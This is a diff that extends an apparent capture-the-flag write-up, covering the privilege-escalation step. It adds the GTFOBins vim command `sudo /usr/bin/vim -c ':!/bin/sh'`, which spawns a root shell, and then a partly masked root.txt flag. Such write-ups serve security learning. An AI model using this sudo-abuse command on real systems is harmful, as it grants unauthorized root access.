@@ -100,3 +100,13 @@ We can use `sudo -l` to know which commands can be run with root privileges.
 ![](images/privesc.png)
 
 We will use vim to escalate privileges to root. Lets look [GTFObins](https://gtfobins.github.io/gtfobins/vim/) for the command vim.
+
+![](images/gtfobins1.png)
+
+`sudo /usr/bin/vim -c ':!/bin/sh'`
+
+![](images/root.png)
+
+Now we are root and can read the root.txt file in /root/ directory
+
+`root.txt    w*********************************************E=`
